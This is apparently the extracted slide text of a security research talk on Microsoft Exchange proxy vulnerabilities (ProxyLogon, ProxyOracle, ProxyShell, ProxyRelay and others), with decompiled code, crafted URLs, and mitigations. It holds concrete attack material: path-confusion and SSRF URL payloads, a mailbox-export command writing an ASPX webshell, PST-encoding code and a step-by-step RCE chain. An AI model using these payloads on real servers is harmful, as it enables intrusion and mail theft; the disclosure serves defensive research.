1.
Request Section
> CopyHeadersToServerRequest
> CopyCookiesToServerRequest
> AddProtocolSpecificHeadersToServerRequest
2.
Proxy Section
> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
Arbitrary Backend Assignment
1
2
protected override AnchorMailbox ResolveAnchorMailbox() {
HttpCookie httpCookie = base.ClientRequest.Cookies["X-AnonResource-Backend"];
if (httpCookie != null) {
this.savedBackendServer = httpCookie.Value;
}
return new ServerInfoAnchorMailbox(
BackEndServer.FromString(this.savedBackendServer), this);
}
HttpProxy\OwaResourceProxyRequestHandler.cs
https://[foo]@example.com:443/path#]:444/owa/auth/x.js
Super SSRF
• What's the root cause about this arbitrary backend assignment?
• The Exchange has to adapt the compatibility between new and old architectures, 
hence Exchange introduces the cookie
• A Super SSRF
• Control almost all the HTTP request and get all the response
• Attach with a Kerberos Ticket with Exchange$ account privilege automatically
• Leverage the backend internal API /ecp/proxylogon.ecp to obtain a valid Control 
Panel session and a file-write bug to get RCE
Demo
https://youtu.be/SvjGMo9aMwE
ProxyOracle
• An interesting Exchange Server exploit with different approach
• An unauthenticated attacker can recover the victim's username and password 
in plaintext format simply by pushing the user open the malicious link
• ProxyOracle is chained with 2 bugs:
• CVE-2021-31195 - Reflected Cross-Site Scripting 
• CVE-2021-31196 - Padding Oracle Attack on Exchange Cookies Parsing
How Users Log-in OWA/ECP?
Form-Based Authentication
IIS
IIS
Remote
PowerShell
RPC 
Proxy
EWS/OWA
ECP/OAB…
Mailbox Database
HTTP/HTTPS
IIS Modules
Validation
Logging
IIS Modules
Filter
FBA
Oauth
…
Rehydration
Routing
Update
RBAC
HTTP Proxy Module
How FBA Cookies Looks Like
cadataTTL
cadataKey
cadata
cadataIV
cadataSig
FbaModule Encryption Logic
@key = GetServerSSLCert().GetPrivateKey()
cadataSig = RSA(@key).Encrypt("Fba Rocks!")
cadataIV
= RSA(@key).Encrypt(GetRandomBytes(16))
cadataKey = RSA(@key).Encrypt(GetRandomBytes(16))
@timestamp = GetCurrentTimestamp()
cadataTTL
= AES_CBC(cadataKey, cadataIV).Encrypt(@timestamp)
@blob  = "Basic " + ToBase64String(UserName + ":" + Password)
cadata = AES_CBC(cadataKey, cadataIV).Encrypt(@blob)
PSEUDO CODE
FbaModule Encryption Logic
private void ParseCadataCookies(HttpApplication httpApplication) {
using (ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor()) {
try {
byte[] array5 = Convert.FromBase64String(request.Cookies["cadata"].Value);
bytes2 = transform.TransformFinalBlock(array5, 0, array5.Length);
} catch (CryptographicException arg8) {
return;
}
}
}
HttpProxy\FbaModule.cs
The Oracle
protected enum LogonReason {
None,
Logoff,
InvalidCredentials,
Timeout,
ChangePasswordLogoff
}
\FbaModule.cs
Padding 
Error
Padding 
Good
Login
Failure
Login
Success
AES
Decrypt
/logon.aspx
?reason=2
Continue
Login
/logon.aspx
?reason=0
We can decrypt the cookies now
But… How to get the client cookies?
We discover a new XSS to chain together
However, all sensitive cookies are protected by HttpOnly😥
Take Over Client Requests
Visit page /foo.gif
Send response
Proxy page /foo.gif
Send response
Send malicious mail to victim
Trigger the XSS
Set SSRF cookie
Victim
Exchange
Attacker
Open malicious mail
Redirect to XSS page
1
2
3
4
Demo
https://youtu.be/VuJvmJZxogc
ProxyShell
• The exploit chain we demonstrated at Pwn2Own 2021
• An unauthenticated attacker can execute arbitrary commands on Microsoft 
Exchange Server through an only exposed 443 port!
• ProxyShell is chained with 3 bugs:
• CVE-2021-34473 - Pre-auth Path Confusion leads to ACL Bypass
• CVE-2021-34523 - Elevation of Privilege on Exchange PowerShell Backend
• CVE-2021-31207
- Post-auth Arbitrary-File-Write leads to RCE
Where ProxyShell Begin?
1.
Request Section
> CopyHeadersToServerRequest
> CopyCookiesToServerRequest
> AddProtocolSpecificHeadersToServerRequest
2.
Proxy Section
> GetTargetBackEndServerUrl
> CreateServerRequest
> GetServerResponse
3.
Response Section
> CopyHeadersToClientResponse
> CopyCookiesToClientResponse
BeginRequest
AuthenticateRequest
AuthorizeRequest
MapRequestHandler
EndRequest
IHttpHandler
LogRequest
ProxyShell
• ProxyShell started with a Path Confusion bug on Exchange Server  
Explicit Logon feature
• The feature is designed to enable users to open another mailbox/calendar and 
display it in a new browser window
• The Exchange parsed the mailbox address and normalized the URL internally
https://exchange/OWA/PI:EMAIL/Default.aspx
2
Extract Mailbox Address from URL
1
protected override AnchorMailbox ResolveAnchorMailbox() {
if (RequestPathParser.IsAutodiscoverV2PreviewRequest(base.ClientRequest.Url.AbsolutePath)) 
text = base.ClientRequest.Params["Email"];
// …
this.isExplicitLogonRequest = true;
this.explicitLogonAddress = text;
}
public static bool IsAutodiscoverV2PreviewRequest(string path) {
return path.EndsWith("/autodiscover.json", StringComparison.OrdinalIgnoreCase);
}
HttpProxy\EwsAutodiscoverProxyRequestHandler.cs
The Fatal Erase
protected override UriBuilder GetClientUrlForProxy() {
string absoluteUri = base.ClientRequest.Url.AbsoluteUri;
uri = UrlHelper.RemoveExplicitLogonFromUrlAbsoluteUri(absoluteUri, 
this.explicitLogonAddress);
return new UriBuilder(uri);
}
public static string RemoveExplicitLogonFromUrlAbsoluteUri(string absoluteUri, string
explicitLogonAddress) {
string text = "/" + explicitLogonAddress;
if (absoluteUri.IndexOf(text) != -1)
return absoluteUri.Substring(0, num) + absoluteUri.Substring(num + text.Length);
}
HttpProxy\EwsAutodiscoverProxyRequestHandler.cs
1
2
The actual part to be removed
Explicit Logon pattern
https://exchange/autodiscover/autodiscover.json?@foo.com/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
The actual part to be removed
Explicit Logon pattern
https://exchange/autodiscover/autodiscover.json?@foo.com/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
https://exchange:444/?&
Email=autodiscover/autodiscover.json%PI:EMAIL
Arbitrary Backend Access Again!
Exchange PowerShell Remoting
• The Exchange PowerShell Remoting is a command-line interface that 
enables the automation of Exchange tasks
• The Exchange PowerShell Remoting is built upon PowerShell API and uses the 
Runspace for isolations. All operations are based on WinRM protocol
• Interact with the PowerShell Backend fails because there is no mailbox for the 
SYSTEM user
• We found a piece of code extract Access-Token from URL 
Extract Access Token from URL
2
1
private void OnAuthenticateRequest(object source, EventArgs args) {
HttpContext httpContext = HttpContext.Current;
if (httpContext.Request.IsAuthenticated) {
if (string.IsNullOrEmpty(httpContext.Request.Headers["X-CommonAccessToken"])) {
Uri url = httpContext.Request.Url;
Exception ex = null;
CommonAccessToken commonAccessToken = CommonAccessTokenFromUrl(httpContext.
User.Identity.ToString(), url, out ex);
}
}
}
\Configuration\RemotePowershellBackendCmdletProxyModule.cs
Extract Access Token from URL
private CommonAccessToken CommonAccessTokenFromUrl(string user, Uri requestURI, 
out Exception ex) {
CommonAccessToken result = null;
string text = LiveIdBasicAuthModule.GetNameValueCollectionFromUri(
requestURI).Get("X-Rps-CAT");
result = CommonAccessToken.Deserialize(Uri.UnescapeDataString(text));
return result;
}
\RemotePowershellBackendCmdletProxyModule.cs
Privilege Downgrade
• An Elevation of Privilege (EOP) because we can access Exchange 
PowerShell Backend directly
• The intention of this operation is to be a quick proxy for Internal Exchange 
PowerShell communications
• Specify the Access-Token in X-Rps-CAT to Impersonate to any user
• We use this Privilege Escalation to "downgrade" ourself from SYSTEM to Exchange 
Admin
Execute Arbitrary Exchange PowerShell as Admin
And then?
Attack Exchange PowerShell
• The last piece of the puzzle is to find a post-auth RCE to chain together
• Since we are Exchange admin now, It's easy to abuse the Exchange PowerShell 
command New-MailboxExportRequest to export user's mailbox into an UNC path
New-MailboxExportRequest –Mailbox PI:EMAIL
–FilePath \\127.0.0.1\C$\path\to\shell.aspx
Payload Delivery
• How to embed the malicious payload into the exported file?
• We deliver the malicious payloads by Emails (SMTP)  but the file is encoded😢
• The exported file is in Outlook Personal Folders (PST) format, by reading the MS-
PST documentation, we learned it's just a simple permutation encoding
mpbbCrypt = [65, 54, 19, 98, 168, 33, 110, 187, 244, 22, 204, 4, 127, 100, 232, …]
encode_table = bytes.maketrans((bytearray(mpbbCrypt), bytearray(range(256)))
'…'.translate(encode_table)
\RemotePowershellBackendCmdletProxyModule.cs
Put it All Together
1.
Deliver our encoded WebShell payload by SMTP 
2. Launch the native PowerShell and intercept the WinRM protocol
• Rewrite the /PowerShell/ to /Autodiscover/ to trigger the Path Confusion bug
• Add query string X-Rps-CAT with corresponding Exchange Admin Access Token
3. Execute commands inside the established PowerShell session
• New-ManagementRoleAssignment to grant ourself Mailbox Import Export Role
• New-MailboxExportRequest to write ASPX file into the local UNC path
4. Enjoy the shell
Demo
https://youtu.be/FC6iHw258RI
Proxy-Related Attacks
ProxyLogon
• CVE-2021-26855
• CVE-2021-27065
ProxyNotFound
• CVE-2021-28480
• CVE-2021-28481
ProxyToken
• CVE-2021-33766
ProxyOracle
• CVE-2021-31195
• CVE-2021-31196
ProxyRelay
• CVE-2021-33768
• CVE-2021-TBA
ProxyShell
• CVE-2021-34473
• CVE-2021-34523
• CVE-2021-31207
ProxyNotFound
• Exchange vulnerabilities reported by NSA (Dubbed by NCSC Vietnam)
• CVE-2021-28480 - Pre-auth SSRF/ACL bypass
• CVE-2021-28481 - Pre-auth SSRF/ACL bypass
• Also under our new attack surface
• The bug located at the FrontEnd of CAS
• The root cause is similar to the pre-auth part of ProxyLogon but retrieving another 
user-supplied cookie as the BackEnd target
ProxyNotFound: Arbitrary Backend 
Assignment
protected override AnchoredRoutingTarget TryFastTargetCalculationByAnchorMailbox(
AnchorMailbox anchorMailbox) {
if (this.backEndCookie == null || !base.IsRetryOnErrorEnabled) {
this.FetchBackEndServerCookie();
}
BackEndServer backEndServer = anchorMailbox.AcceptBackEndCookie(this.backEndCookie)
}
private void FetchBackEndServerCookie() {
foreach (string text in new string[] {"X-BackEndCookie", "X-BackEndCookie2"}) {
// ...
httpCookie.Values[text] = backEndCookieEntryBase.ToObscureString();
}
}
HttpProxy\BEServerCookieProxyRequestHandler.cs
BASE64 Decode
XOR with 0xFF
server~x]@ex2019:444/mapi/nspi/?a.a#~
1941962753~12/1/2021 12:25:12 AM
Proxy-Related Attacks
ProxyLogon
• CVE-2021-26855
• CVE-2021-27065
ProxyNotFound
• CVE-2021-28480
• CVE-2021-28481
ProxyToken
• CVE-2021-33766
ProxyOracle
• CVE-2021-31195
• CVE-2021-31196
ProxyRelay
• CVE-2021-33768
• CVE-2021-TBA
ProxyShell
• CVE-2021-34473
• CVE-2021-34523
• CVE-2021-31207
ProxyToken
• Exchange vulnerability reported by Le Xuan Tuyen of VNPT ISC (working 
with Zero Day Initiative)
• CVE-2021-33766 - Authentication bypass
• Exploit the "Delegated Authentication" feature in the CAS FrontEnd to 
perform configuration actions on users
• Also under our new attack surface ;)
• Install a mail forwarding rule to read any user's incoming mail
The April Patch Kills (almost) All…
Post-Proxy Era of MS Exchange
• The pre-auth part of this new attack surface has been mitigated
• The attack surface may not be as powerful as before :(
• Is there any new hope?
1.
The path confusion of ProxyShell is still alive
2.
The mechanism between the FrontEnd and BackEnd is still interesting
3.
Combine another level issues/features to rescue the auth bypass
Proxy-Related Attacks
ProxyLogon
• CVE-2021-26855
• CVE-2021-27065
ProxyNotFound
• CVE-2021-28480
• CVE-2021-28481
ProxyToken
• CVE-2021-33766
ProxyOracle
• CVE-2021-31195
• CVE-2021-31196
ProxyRelay
• CVE-2021-33768
• CVE-2021-TBA
ProxyShell
• CVE-2021-34473
• CVE-2021-34523
• CVE-2021-31207
ProxyRelay
• ProxyRelay is a set of authentication bypass attacks that allows  an 
attacker to impersonate as any users (works perfectly after April Patch!)
• CVE-2021-33768
• CVE-2021-TBA
• ...
• Exploit the NTLM-Relay to bypass the authentication of CAS Proxy
• ProxyRelay = CAS Proxy + NTLM-Relay
Problems to be Solved
• NTLM-Relay requires the user to trigger the relay passively
• Bypass: Printer-Bug for the rescue!
• NTLM-Relay protection: Same-Host Reflection
• Bypass: Exchange Cluster is common in corporations. We relay the NTLM 
of server-A to server-B so that it won't trigger any Same-Host detection!
• NTLM-Relay protection: SMB Signing / Channel Binding
• Bypass: We use SMB-to-HTTPS. Exchange disables the TLS Channel 
Binding by default!
CVE-2021-33768
• MSRC acknowledges 2 researchers in the advisory
• Tianze Ding (@D1iv3) with Tencent Security Xuanwu Lab
• Orange Tsai (@orange_8361) from DEVCORE Research Team
• The exploit concept:
1.
Trigger the Printer-Bug on Exchange-A
2.
Relay the NTLM to the FrontEnd of Exchange-B to bypass the CAS authentication
3.
Forge the authorization part in EWS to impersonate as any user
• The June 2021 patch mitigated the CVE by prohibiting Exchange Machine 
Account from authenticating in the FrontEnd
CVE-2021-TBA
• CVE-2021-TBA is another similar but more fundamental vulnerability
• Report to MSRC at June 02, 2021 with 90(+30) days disclosure policy
• After a discussion with MSRC, it looks like there are no quick and simple fixes, but 
design level changes. The patch should require an amount of time for preparation 
and testing
• As a responsible researcher, sorry we decide NOT to disclose today
Demo
To Be Released
Mitigations
1.
Keep Exchange Server up-to-date
2.
Do not externally face Exchange Server to the Internet (especially web)
3. About ProxyRelay, as to a design-level issue, your hands are tied :(
• Stop Printer Spooler Service
• Disable NTLM authentication (didn't check if there are any side-effects yet)
4.
Move to Office 365 Exchange Online😏(Just kidding)
orange_8361
PI:EMAIL
Thanks!
https://blog.orange.tw